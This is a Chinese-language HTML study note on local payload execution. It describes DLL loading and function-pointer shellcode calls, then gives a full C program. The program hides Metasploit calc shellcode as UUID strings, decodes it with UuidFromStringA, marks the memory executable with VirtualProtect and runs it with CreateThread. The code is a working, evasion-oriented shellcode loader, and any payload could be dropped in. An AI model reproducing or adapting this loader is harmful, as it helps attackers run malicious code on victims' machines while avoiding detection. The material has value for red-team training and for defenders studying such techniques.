<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title># 本地有效载荷执行,本地有效载荷执行</title>
    <link rel="stylesheet" href="/assets/css/notes.min.css">
</head>
<body>
    <div class="main-content-wrapper">
        <main class="content">
            <h1>本地有效载荷执行</h1>
<h2>1.dll</h2>
<p>dll：使用 LoadLibraryA 加载 DLL，基本流程是首先混淆 payload，然后分配内存，并将 payload 写入分配的内存，修改内存保护，通过创建线程执行有效载荷，也可以是通过函数指针来执行有效负载（不建议，因为 Msfvenom 生成的 shellcode 在执行完毕后会终止线程，那么也就是主线程，但是可以在另一个新线程中这么做）</p>
<h2>2.shellcode</h2>
<p>本地有效载荷执行 shellcode</p>
<p>函数指针方式：</p>
<pre><code class="language-c">(*(VOID(*)()) pShellcodeAddress)();
</code></pre>
<p>等同于：</p>
<pre><code class="language-c">typedef VOID (WINAPI* fnShellcodefunc)();       // 在主函数之前定义
fnShellcodefunc pShell = (fnShellcodefunc) pShellcodeAddress;
pShell();
</code></pre>
<p>弹计算器：</p>
<pre><code class="language-c">#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

// where calc.bin is metasploit's calc x64 shellcode
char* UuidArray[] = {
        &quot;E48348FC-E8F0-00C0-0000-415141505251&quot;, &quot;D2314856-4865-528B-6048-8B5218488B52&quot;, &quot;728B4820-4850-B70F-4A4A-4D31C94831C0&quot;,
        &quot;7C613CAC-2C02-4120-C1C9-0D4101C1E2ED&quot;, &quot;48514152-528B-8B20-423C-4801D08B8088&quot;, &quot;48000000-C085-6774-4801-D0508B481844&quot;,
        &quot;4920408B-D001-56E3-48FF-C9418B348848&quot;, &quot;314DD601-48C9-C031-AC41-C1C90D4101C1&quot;, &quot;F175E038-034C-244C-0845-39D175D85844&quot;,
        &quot;4924408B-D001-4166-8B0C-48448B401C49&quot;, &quot;8B41D001-8804-0148-D041-5841585E595A&quot;, &quot;59415841-5A41-8348-EC20-4152FFE05841&quot;,
        &quot;8B485A59-E912-FF57-FFFF-5D48BA010000&quot;, &quot;00000000-4800-8D8D-0101-000041BA318B&quot;, &quot;D5FF876F-E0BB-2A1D-0A41-BAA695BD9DFF&quot;,
        &quot;C48348D5-3C28-7C06-0A80-FBE07505BB47&quot;, &quot;6A6F7213-5900-8941-DAFF-D563616C6300&quot;
};

#define NumberOfElements 17

typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
    RPC_CSTR        StringUuid,
    UUID* Uuid
    );

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE           pBuffer = NULL,
        TmpBuffer = NULL;

    SIZE_T          sBuffSize = NULL;

    PCSTR           Terminator = NULL;

    NTSTATUS        STATUS = NULL;

    // Getting the UuidFromStringA function's base address from Rpcrt4.dll
    fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT(&quot;RPCRT4&quot;)), &quot;UuidFromStringA&quot;);
    if (pUuidFromStringA == NULL) {
        printf(&quot;[!] GetProcAddress Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }
    // Getting the size of the shellcode (number of elements * 16)
    sBuffSize = NmbrOfElements * 16;
    // Allocating memory that will hold the deobfuscated shellcode
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL) {
        printf(&quot;[!] HeapAlloc Failed With Error : %d \n&quot;, GetLastError());
        return FALSE;
    }
    // Setting TmpBuffer to be equal to pBuffer
    TmpBuffer = pBuffer;


    // Loop through all the addresses saved in UuidArray
    for (int i = 0; i &lt; NmbrOfElements; i++) {
        // UuidArray [i] is a single UUid address from the array UuidArray
        if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
            // Failed
            printf(&quot;[!] UuidFromStringA  Failed At [%s] With Error 0x%0.8X\n&quot;, UuidArray[i], STATUS);
            return FALSE;
        }

        // 16 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
        TmpBuffer = (PBYTE)(TmpBuffer + 16);
    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;
    return TRUE;
}

int main() {

    PBYTE       pDeobfuscatedPayload = NULL;
    SIZE_T      sDeobfuscatedSize = NULL;

    // Prinitng some information
    printf(&quot;[i] Injecting Shellcode The Local Process Of Pid: %d \n&quot;, GetCurrentProcessId());

    printf(&quot;[#] Press &lt;Enter&gt; To Decrypt ... &quot;);
    getchar();

    printf(&quot;[i] Decrypting ...&quot;);
    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &amp;pDeobfuscatedPayload, &amp;sDeobfuscatedSize)) {
        return -1;
    }
    printf(&quot;[+] DONE !\n&quot;);

    printf(&quot;[i] Deobfuscated Payload At : 0x%p Of Size : %d \n&quot;, pDeobfuscatedPayload, sDeobfuscatedSize);


    printf(&quot;[#] Press &lt;Enter&gt; To Allocate ... &quot;);
    getchar();
    // Allocating memory the size of sDeobfuscatedSize
    // With memory permissions set to read and write so that we can write the payload later
    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf(&quot;[!] VirtualAlloc Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }


    printf(&quot;[i] Allocated Memory At : 0x%p \n&quot;, pShellcodeAddress);

    printf(&quot;[#] Press &lt;Enter&gt; To Write Payload ... &quot;);
    getchar();

    // Copying the payload to the allocated memory
    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
    // Cleaning the pDeobfuscatedPayload buffer, since it is no longer needed
    memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);


    DWORD dwOldProtection = NULL;
    // Setting memory permissions at pShellcodeAddress to be executable
    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
        printf(&quot;[!] VirtualProtect Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    printf(&quot;[#] Press &lt;Enter&gt; To Run ... &quot;);
    getchar();

    // Running the shellcode as a new thread's entry 
    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf(&quot;[!] CreateThread Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    // Freeing pDeobfuscatedPayload
    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    printf(&quot;[#] Press &lt;Enter&gt; To Quit ... &quot;);
    getchar();

    return 0;
}
</code></pre>

        </main>
    </div>
</body>
</html>